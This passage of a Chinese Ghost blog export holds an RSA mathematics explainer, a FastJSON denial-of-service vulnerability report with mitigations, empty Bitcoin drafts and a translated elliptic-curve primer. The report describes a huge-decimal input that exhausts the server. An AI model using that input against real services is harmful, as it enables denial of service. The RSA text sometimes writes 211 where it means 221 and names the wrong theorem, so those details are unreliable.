% p\n\n\n这也是取模运算的基本运算法则\n\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期\n3.\n\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1\n的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1),\n也将成为该序列的一个周期.\n\n（五）公钥加密的可能性\n加密算法和解密算法有可能是不对称的吗？\n\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少.\n如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息,\n让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 ×\n11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后,\n末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以\n11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\n\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解:\n猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来.\n\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\n\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和\nLeonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\n\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\n\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法,\n判断将一个大数分解成两个质数的乘积.\n\n判断一个数是否是质数的方法, 可以搜索以下内容:\n\n Fermat 素性测试\n Miller-Rabin 素性测试\n AKS 素性测试\n\n\n（六）RSA 算法\n所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\n\n首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17\n– 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期).\n换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 ×\n35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数,\n把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35\n次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35\n次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时,\n反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X\n取余后的结果, 不会造成信息的丢失.\n\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设\n211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积.\n\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和\nd ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ?\n\n还记得 中国剩余定理  吗?\n\n上面的问题可以写成数学表达式 e · d mod 192 = 1\n\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192\n的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的.\n\n让我们用 扩展的辗转相除法  再推导一次吧 !\n\n因为 192 除以 11 商 17 余 5,\n即 17个11 比 1个192 少 5,\n且 18个11 比 1个192 多 6,\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\n\n\n这正是我们需要的结果! d = 35\n\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥.\n这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\n\n<几何原本> 约于公元前300年由古希腊数学家 欧几里得  所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-09-13 03:50:47","updated_at":"2019-10-10 09:34:57","published_at":"2019-09-13 15:25:52","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d871d6c3faccd0001d052e5","uuid":"d9cb1d40-909d-445a-be2b-e6e45a1b1ada","title":"深入理解比特币(一) 椭圆曲线密码学","slug":"shen-ru-li-jie-bi-te-bi-yi","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","html":"<!--kg-card-begin: html--><script type=\"text/javascript\" async\n  src=\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\">\n</script><!--kg-card-end: html-->","comment_id":"5d871d6c3faccd0001d052e5","plaintext":null,"feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-09-22 07:06:20","updated_at":"2019-12-20 07:47:36","published_at":null,"custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5ddb49c22ee0ee0001818fa1","uuid":"731dc33c-3d0a-4589-88e2-e4afca03ada6","title":"FastJSON IntegerSerializer 潜在DOS攻击风险问题","slug":"fastjson-serializer-dos-vulnerability","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"### 背景\\n\\n近日, 慢雾安全平台的白帽子给公司项目提交了一个安全漏洞:\\n\\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\\n\\n\\n### 分析\\n\\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 : \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/1.png\"}],[\"image\",{\"src\":\"/content/images/2019/11/2.png\"}],[\"markdown\",{\"markdown\":\"可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\\n\\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\\n\\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\\n\\n\\n\\n### 解决方案\\n\\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\\n\\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下 \\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/3.png\"}],[\"markdown\",{\"markdown\":\"\\nc. 在涉及到解析用户提交的数据时, 谨慎使用BigDecimal类型, 当确实需要准确精度保证时, 可以考虑先将小数数据转换为String类型, 在校验数据长度后再将数据转为BigDecimal\\n\\n\\n\\n这次的问题也给我带来了一些的思考:\\n\\n使用BigDecimal的优势是能够确保精度不丢失, 但这背后的性能开销和安全风险也是值得我们在开发过程中认真考虑的问题\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","html":"<!--kg-card-begin: markdown--><h3 id=\"\">背景</h3>\n<p>近日, 慢雾安全平台的白帽子给公司项目提交了一个安全漏洞:</p>\n<p>向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击</p>\n<h3 id=\"\">分析</h3>\n<p>根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 :</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/11/1.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/11/2.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: markdown--><p>可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?</p>\n<p>我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.</p>\n<p>对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点</p>\n<h3 id=\"\">解决方案</h3>\n<p>a. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内</p>\n<p>b. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/11/3.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: markdown--><p>c. 在涉及到解析用户提交的数据时, 谨慎使用BigDecimal类型, 当确实需要准确精度保证时, 可以考虑先将小数数据转换为String类型, 在校验数据长度后再将数据转为BigDecimal</p>\n<p>这次的问题也给我带来了一些的思考:</p>\n<p>使用BigDecimal的优势是能够确保精度不丢失, 但这背后的性能开销和安全风险也是值得我们在开发过程中认真考虑的问题</p>\n<!--kg-card-end: markdown-->","comment_id":"5ddb49c22ee0ee0001818fa1","plaintext":"背景\n近日, 慢雾安全平台的白帽子给公司项目提交了一个安全漏洞:\n\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间,\n耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\n\n分析\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 :\n\n可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\n\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数,\nFastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\n\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\n\n解决方案\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\n\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时,\n用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下\n\nc. 在涉及到解析用户提交的数据时, 谨慎使用BigDecimal类型, 当确实需要准确精度保证时, 可以考虑先将小数数据转换为String类型,\n在校验数据长度后再将数据转为BigDecimal\n\n这次的问题也给我带来了一些的思考:\n\n使用BigDecimal的优势是能够确保精度不丢失, 但这背后的性能开销和安全风险也是值得我们在开发过程中认真考虑的问题","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-11-25 03:25:54","updated_at":"2019-11-25 03:44:15","published_at":"2019-11-25 03:41:53","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5df35add2ee0ee0001818fd7","uuid":"8240e9a6-3b14-480d-92d3-a0adcd0dea1a","title":"深入理解比特币(五) Atomic Swap跨链交易","slug":"shen-ru-li-jie-bi-te-bi-x-atomic-swap","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","html":null,"comment_id":"5df35add2ee0ee0001818fd7","plaintext":null,"feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-12-13 09:33:17","updated_at":"2019-12-16 09:38:42","published_at":null,"custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5df74fdb2ee0ee0001818fe0","uuid":"e9b91ab0-a1e7-42d2-a250-3dc99ca16e18","title":"深入理解比特币(二) 交易","slug":"shen-ru-li-jie-bi-te-bi-er-ren-shi-bi-te-bi-jiao-yi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","html":null,"comment_id":"5df74fdb2ee0ee0001818fe0","plaintext":null,"feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-12-16 09:35:23","updated_at":"2019-12-16 09:36:49","published_at":null,"custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5df750192ee0ee0001818fe7","uuid":"70438ac8-5b76-40eb-bfb6-cf4f9f06750b","title":"深入理解比特币(三) 区块和网络","slug":"shen-ru-li-jie-bi-te-bi-er-jiao-yi","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[],\"markups\":[],\"sections\":[[1,\"p\",[]]]}","html":null,"comment_id":"5df750192ee0ee0001818fe7","plaintext":null,"feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-12-16 09:36:25","updated_at":"2019-12-16 09:36:36","published_at":null,"custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5df750602ee0ee0001818ff1","uuid":"391ed443-8421-47dc-9560-488a597ae613","title":"深入理解比特币(四) BIP (Bitcoin Improvement Proposals)","slug":"shen-ru-li-jie-bi-te-bi-si-bip","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","html":null,"comment_id":"5df750602ee0ee0001818ff1","plaintext":null,"feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-12-16 09:37:36","updated_at":"2019-12-16 09:38:20","published_at":null,"custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5dfc7ca42ee0ee000181900e","uuid":"d24749c1-f882-4e0f-907b-ba6347cb36dd","title":"[译] 椭圆曲线密码学: 入门","slug":"elliptic-curve-cryptography-a-gentle-introduction-zh","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 **ECC**, **ECD**或者**ECDSA**. ECC是椭圆曲线密码学(`Elliptic Curve Cryptography`)的首字母缩写, 而另外两个都是基于ECC实现的算法.\"}],[\"markdown\",{\"markdown\":\"如今, 我们在 [TLS](https://tools.ietf.org/html/rfc4492), [PGP](https://tools.ietf.org/html/rfc6637) 和 [SSH](https://tools.ietf.org/html/rfc5656) 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在[比特币](https://en.bitcoin.it/wiki/Secp256k1)和其他各种加密货币中发挥的巨大作用了.\"}],[\"markdown\",{\"markdown\":\"在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和[可以轻松实现的简化模型](http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/), 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\"}],[\"markdown\",{\"markdown\":\"希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的**目标**并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 **什么是ECC以及它为什么是安全的**, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\"}],[\"markdown\",{\"markdown\":\"具体来说, 本系列文章将涉及以下内容: \\n\\n1. [实数域上的椭圆曲线和群论](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/) (本篇文章将会讨论)\\n2. [有限域上的椭圆曲线和离散对数难题](http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh)\\n3. [秘钥对的生成及两种ECC算法: ECDH和ECDSA](http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh)\\n4. [ECC破解算法和与RSA的对比](http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh)\"}],[\"markdown\",{\"markdown\":\"为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是\\\"简单\\\"问题, 什么是\\\"复杂\\\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\"}],[\"html\",{\"html\":\"<a id=\\\"elliptic-curves\\\"> </a>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线 \\n\\n首先, 什么是椭圆曲线? [Wolfram MathWorld](http://mathworld.wolfram.com/) 给出了一个超赞且完善的[定义](http://mathworld.wolfram.com/EllipticCurve.html). 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合: \"}],[\"html\",{\"html\":\"$$y^2 = x^3 + ax + b$$\"}],[\"html\",{\"html\":\"且满足 $4a^3 + 27b^2 \\\\ne 0$ (以便排除<a href=\\\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\\\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\"}],[\"image\",{\"src\":\"/content/images/2019/12/curves.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\\n</pre>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singularities.png\"}],[\"html\",{\"html\":\"奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.\"}],[\"markdown\",{\"markdown\":\"根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:\"}],[\"html\",{\"html\":\"$$\\\\left\\\\{ (x, y) \\\\in \\\\mathbb{R}^2\\\\ |\\\\ y^2 = x^3 + ax + b,\\\\ 4 a^3 + 27 b^2 \\\\ne 0 \\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{ 0 \\\\right\\\\}$$\"}],[\"markdown\",{\"markdown\":\"# 群\\n\\n\"}],[\"html\",{\"html\":\"<p>\\n数学上的群是指定义了一个用\\\"+\\\"表示的二元运算\\\"加法\\\"的集合. 为了让集合 $\\\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \\n</p>\\n\\n<ol>\\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\\\mathbb{G}$ 中的元素 </li>\\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$</li>\\n</ol>\\n\\n如果我们再加上第五个条件: \\n<br>\\n<strong>交换律:</strong> $a + b = b + a$\\n<br>\\n那么这个群就可以被称作<strong>阿贝尔群</strong>\\n\\n<p>\\n    根据加法的一般概念, 整数集合 $\\\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\\n</p>\\n\\n<p>\\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"group-law\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线上的群律\"}],[\"html\",{\"html\":\"<p>\\n    我们可以在椭圆曲线上定义一个群, 具体来说:\\n</p>\\n\\n<ul>\\n  <li>\\n    群里的元素是椭圆曲线上的点\\n  </li>\\n  <li>\\n    <strong>单位元</strong>是指在无穷远处的点 0\\n  </li>\\n  <li>\\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\\n  </li>\\n  <li>\\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\\n  </li>\\n</ul>\"}],[\"image\",{\"src\":\"/content/images/2019/12/three-aligned-points.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n在一条直线上的三点之和为0\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\\\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 这是一个阿贝尔群.</strong>\\n</p>\\n\\n<p>\\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"geometric-addition\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 几何意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 的结果</strong>.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \\n    \\n  <ul>\\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\\\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\\n  </ul>\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-point-doubling.gif\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\\n</pre>\"}],[\"html\",{\"html\":\"当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.\"}],[\"html\",{\"html\":\"<p>\\n  <ul>\\n    <li> <strong> 如果 $P \\\\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\\n  </ul>\\n<p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-tangent-line.gif\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \\n很容易就能看出两点之和为切点关于x轴的对称点.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\\n</p>\\n\\n<p>\\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">HTML5/JavaScript版可视化工具</a> !</strong>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"algebraic-addition\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 代数意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 